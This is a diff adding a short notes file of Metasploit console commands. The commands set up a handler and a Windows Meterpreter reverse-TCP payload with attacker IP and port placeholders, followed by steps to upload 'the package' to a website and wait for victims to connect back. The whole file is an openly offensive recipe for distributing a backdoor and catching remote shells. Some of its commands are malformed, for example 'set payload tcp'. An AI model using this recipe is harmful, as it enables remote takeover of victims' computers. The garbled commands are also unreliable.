@@ -1,0 +1,18 @@
+msfconsole
+use exploit/multi/handler
+set payload tcp
+set lhost your_ip_address
+set lport 8080
+exploit -j
+
+-----------------------------------------
+
+use windows/meterpreter/reverse_tcp
+set lhost your_ip_address
+set lport 4444
+exploit -j
+
+-----------------------------------------
+
+->upload the package in your website.
+->wait until the connection establish.
